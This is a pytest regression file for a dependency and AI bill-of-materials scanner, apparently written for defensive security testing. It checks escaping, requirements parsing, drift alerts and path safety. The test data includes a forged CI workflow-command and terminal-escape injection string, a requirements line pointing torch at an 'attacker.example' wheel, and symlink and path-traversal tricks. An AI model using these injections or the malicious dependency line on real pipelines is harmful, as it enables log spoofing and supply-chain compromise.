"""Regressions found by the 0.1.0 pre-publication review."""

from __future__ import annotations

import ast
import hashlib
import json
import sys
import warnings
from pathlib import Path

import pytest
from click.testing import CliRunner

from nexus_symbiote.cli import main
from nexus_symbiote.core.aibom import AIBOM
from nexus_symbiote.scanners.base import parse_python
from nexus_symbiote.scanners.registry import RegistryScanner
from nexus_symbiote.utils.crypto import SIGSTORE_MISSING

FORGED = "x\n::error file=README.md,line=1::forged by inventory\n\x1b[2J\x1b]8;;http://e/\x07"


def _injected(output: str) -> list[str]:
    return [line for line in output.splitlines() if line.lstrip().startswith("::")]


@pytest.mark.parametrize("command", [["vex"], ["--live", "advisories"]])
def test_vex_and_advisories_do_not_echo_inventory_text(tmp_path, command):
    document = json.loads(AIBOM().to_json())
    document[FORGED] = 1
    inventory = tmp_path / "inventory.json"
    inventory.write_text(json.dumps(document))
    result = CliRunner().invoke(main, [*command, str(inventory)])
    assert result.exit_code == 1
    assert "is not a valid native AIBOM file" in result.output
    assert not _injected(result.output)
    assert "\x1b" not in result.output and "forged by inventory" not in result.output


def test_registry_reads_every_root_requirements_file_with_hash_continuations(tmp_path):
    (tmp_path / "requirements-gpu.txt").write_text(
        "torch==2.4.0 \\\n"
        "    --hash=sha256:" + "a" * 64 + " \\\n"
        "    --hash=sha256:" + "b" * 64 + "\n"
        "transformers==4.40.0 --hash=sha256:" + "c" * 64 + "  # pinned\n"
    )
    result = RegistryScanner().scan(tmp_path)
    versions = {c.name: c.version for c in result.components}
    assert versions == {"torch": "==2.4.0", "transformers": "==4.40.0"}
    assert result.scan_failures == []
    assert str(tmp_path / "requirements-gpu.txt") in result.surfaces_scanned


def test_registry_reports_an_include_it_does_not_read(tmp_path):
    (tmp_path / "requirements-base.txt").write_text("openai==1.2.0\n")
    (tmp_path / "requirements.txt").write_text(
        "-r requirements-base.txt\n-r ./requirements-base.txt\n"
    )
    followed = RegistryScanner().scan(tmp_path)
    assert followed.surfaces_excluded == []
    assert [c.name for c in followed.components] == ["openai"]
    (tmp_path / "requirements.txt").write_text("-r deps/base.txt\n--requirement=../outside.txt\n")
    unread = RegistryScanner().scan(tmp_path)
    assert unread.surfaces_excluded == [
        "requirements.txt: included requirements file is not followed"
    ]


def test_registry_keeps_one_component_per_package_across_requirements_files(tmp_path):
    (tmp_path / "AGENTS.md").write_text("Keep receipts.")
    (tmp_path / "requirements.txt").write_text("openai==1.3.0\ntorch==2.3.0\n")
    (tmp_path / "requirements-lock.txt").write_text("openai==1.3.0\ntorch>=2\n")
    result = RegistryScanner().scan(tmp_path)
    assert result.scan_failures == []
    by_name = {c.name: c for c in result.components}
    assert sorted(by_name) == ["openai", "torch"]
    assert str(by_name["openai"].source_path).endswith("requirements.txt")
    assert by_name["openai"].risks == []
    assert by_name["torch"].version == "==2.3.0"
    assert [r.detail for r in by_name["torch"].risks] == [
        "PyPI package 'torch' is declared differently in another dependency manifest."
    ]
    assert by_name["torch"].properties["declarations"] == [
        "requirements-lock.txt: torch>=2",
        "requirements.txt: torch==2.3.0",
    ]
    scanned = CliRunner().invoke(
        main, ["scan", str(tmp_path), "--no-project-policy", "-o", str(tmp_path / "bom.json")]
    )
    assert "conflicting duplicate component" not in scanned.output


@pytest.mark.parametrize(
    ("content", "excluded"),
    [
        ("\ufeffopenai==1.3.0\n", []),
        ("-e git+https://github.com/openai/openai-python@v1.3.0#egg=openai\n", ["unsupported"]),
        ("--editable=./local-agent\n", ["unsupported"]),
        ("git+https://github.com/openai/openai-python@v1.3.0#egg=openai\n", ["unsupported"]),
        ("./wheels/openai-1.3.0-py3-none-any.whl\n", ["unsupported"]),
        ("-r\tdeps/base.txt\n", ["included"]),
        ("--requirem deps/base.txt\n", ["included"]),
        ("--cons=deps/constraints.txt\n", ["included"]),
        ("-rrequirements-extra.txt\n", []),
        ("--index-url https://pypi.org/simple\nopenai==1.3.0  \t# pinned\n", []),
        ("--index-url https://pypi.org/simple -r ../shared/ai.txt\n", ["included"]),
        ("--pre -e ./localpkg\n", ["unsupported"]),
        ("--no-binary :all: --constraint deps/c.txt\n", ["included"]),
        ('-r "requirements-extra.txt"\n', []),
        ("-r 'unbalanced\n", ["unsupported"]),
    ],
)
def test_registry_records_requirement_forms_it_cannot_collect(tmp_path, content, excluded):
    (tmp_path / "requirements.txt").write_text(content, encoding="utf-8")
    (tmp_path / "requirements-extra.txt").write_text("langchain==0.1.0\n")
    result = RegistryScanner().scan(tmp_path)
    notes = {
        "unsupported": "requirements.txt: unsupported requirement form is not collected",
        "included": "requirements.txt: included requirements file is not followed",
    }
    assert result.surfaces_excluded == [notes[key] for key in excluded]
    assert result.scan_failures == []
    if not excluded:
        assert "openai" in {c.name for c in result.components} or "-r" in content


def test_a_changed_second_declaration_reaches_the_drift_gate(tmp_path):
    project = tmp_path / "project"
    project.mkdir()
    (project / "AGENTS.md").write_text("Keep receipts.")
    (project / "requirements.txt").write_text("torch==2.3.0+cpu\n")
    gpu = project / "requirements-gpu.txt"
    gpu.write_text("torch==2.3.0+cu121\n")
    runner = CliRunner()
    args = ["scan", str(project), "--no-project-policy", "--report-only", "-o"]
    assert runner.invoke(main, [*args, str(tmp_path / "before.json")]).exit_code == 0
    gpu.write_text("torch @ https://attacker.example/torch-2.3.0-py3-none-any.whl\n")
    assert runner.invoke(main, [*args, str(tmp_path / "after.json")]).exit_code == 0
    drift = runner.invoke(
        main,
        ["diff", "--fail-on-alert", str(tmp_path / "before.json"), str(tmp_path / "after.json")],
    )
    assert drift.exit_code != 0, drift.output
    assert "registry:pypi/torch" in drift.output or "torch" in drift.output


def test_vex_refuses_a_second_name_for_its_input(tmp_path, monkeypatch):
    inventory = tmp_path / "inv.json"
    inventory.write_text(AIBOM().to_json())
    original = inventory.read_bytes()
    (tmp_path / "alias.json").hardlink_to(inventory)
    monkeypatch.chdir(tmp_path)
    result = CliRunner().invoke(main, ["vex", "inv.json", "-o", "alias.json"])
    assert result.exit_code == 2 and "must not overwrite the source inventory" in result.output
    assert inventory.read_bytes() == original


def test_init_refuses_a_symlinked_or_looping_path_without_a_traceback(tmp_path):
    (tmp_path / "real").mkdir()
    (tmp_path / "link").symlink_to(tmp_path / "real", target_is_directory=True)
    (tmp_path / "loop").symlink_to(tmp_path / "loop")
    runner = CliRunner()
    for path in ("link", "loop"):
        result = runner.invoke(main, ["init", "--path", str(tmp_path / path)])
        assert result.exit_code == 1, result.output
        assert result.exception.__class__ is SystemExit
    assert not (tmp_path / "real" / ".nexus-symbiote.yaml").exists()
    created = runner.invoke(main, ["init", "--path", str(tmp_path / "real")])
    assert created.exit_code == 0 and (tmp_path / "real" / ".nexus-symbiote.yaml").exists()


def test_output_parent_references_follow_the_kernel_and_never_a_link(tmp_path, monkeypatch):
    work = tmp_path / "work"
    (work / "real").mkdir(parents=True)
    (work / "link").symlink_to(tmp_path / "elsewhere", target_is_directory=True)
    (tmp_path / "elsewhere").mkdir()
    inventory = work / "inv.json"
    inventory.write_text(AIBOM().to_json())
    original = inventory.read_bytes()
    monkeypatch.chdir(work)
    runner = CliRunner()
    through_link = runner.invoke(main, ["vex", "inv.json", "-o", "link/../inv.json"])
    assert through_link.exit_code == 1
    assert "Cannot write the output file" in through_link.output
    same_file = runner.invoke(main, ["vex", "inv.json", "-o", "real/../inv.json"])
    assert (
        same_file.exit_code == 2 and "must not overwrite the source inventory" in same_file.output
    )
    assert inventory.read_bytes() == original
    (work / "loop").symlink_to(work / "loop")
    loop = runner.invoke(main, ["vex", "inv.json", "-o", "loop/vex.json"])
    assert loop.exit_code == 1 and "Traceback" not in loop.output
    assert loop.exception.__class__ is SystemExit
    beside = runner.invoke(main, ["vex", "inv.json", "-o", "real/../vex.json"])
    assert beside.exit_code == 0, beside.output
    assert (work / "vex.json").exists() and not list((tmp_path / "elsewhere").iterdir())


def test_baseline_and_import_refuse_unwritable_outputs_without_a_traceback(tmp_path):
    project = tmp_path / "project"
    project.mkdir()
    (project / "AGENTS.md").write_text("Keep receipts.")
    runner = CliRunner()
    baseline = runner.invoke(main, ["baseline", str(project), "-o", str(tmp_path / "no/b.json")])
    assert baseline.exit_code == 1 and "Cannot write the output file" in baseline.output
    assert baseline.exception.__class__ is SystemExit
    report = Path(__file__).parent / "fixtures/shadowscan/code-report-0.1.4.json"
    imported = runner.invoke(main, ["import-shadowscan", str(report), "-o", "/", "--report-only"])
    assert imported.exit_code == 1 and "Cannot create output" in imported.output
    assert imported.exception.__class__ is SystemExit


def test_output_paths_are_refused_cleanly_and_parent_references_resolve(tmp_path, monkeypatch):
    project = tmp_path / "work" / "project"
    project.mkdir(parents=True)
    (project / "AGENTS.md").write_text("Keep receipts.")
    (tmp_path / "real").mkdir()
    (tmp_path / "linked").symlink_to(tmp_path / "real")
    monkeypatch.chdir(project)
    runner = CliRunner()
    args = ["scan", ".", "--no-project-policy", "--report-only", "-o"]
    parent = runner.invoke(main, [*args, "../bom.json"])
    assert parent.exit_code == 0, parent.output
    assert AIBOM.load(tmp_path / "work" / "bom.json").components
    for refused in (tmp_path / "linked" / "bom.json", tmp_path / "missing" / "bom.json", tmp_path):
        result = runner.invoke(main, [*args, str(refused)])
        assert result.exit_code == 1
        assert "Cannot write the output file" in result.output
        assert "Traceback" not in result.output and result.exception.__class__ is SystemExit
    assert not (tmp_path / "real" / "bom.json").exists()


def test_missing_sigstore_is_not_reported_as_a_failed_signature(tmp_path, monkeypatch):
    artifact = tmp_path / "model.bin"
    artifact.write_bytes(b"weights")
    bundle = tmp_path / "model.sigstore.json"
    bundle.write_text("{}")
    for name in [m for m in sys.modules if m == "sigstore" or m.startswith("sigstore.")]:
        monkeypatch.delitem(sys.modules, name)
    monkeypatch.setitem(sys.modules, "sigstore", None)
    result = CliRunner().invoke(
        main,
        [
            "verify-artifact",
            "model.bin",
            "--project",
            str(tmp_path),
            "--sha256",
            "sha256:" + hashlib.sha256(b"weights").hexdigest(),
            "--bundle",
            str(bundle),
            "--signer-identity",
            "release@example.com",
            "--issuer",
            "https://token.actions.githubusercontent.com",
        ],
    )
    assert result.exit_code == 1
    assert SIGSTORE_MISSING in result.output
    assert "signature or signer policy verification failed" not in result.output


def test_scanned_python_compiles_without_printing_its_bytes():
    source = 'value = "\\\x1b"\n'
    with warnings.catch_warnings(record=True) as unguarded:
        warnings.simplefilter("always")
        ast.parse(source)
    assert unguarded, "the interpreter no longer warns; this regression test needs updating"
    with warnings.catch_warnings(record=True) as guarded:
        warnings.simplefilter("always")
        assert isinstance(parse_python(source), ast.Module)
    assert guarded == []
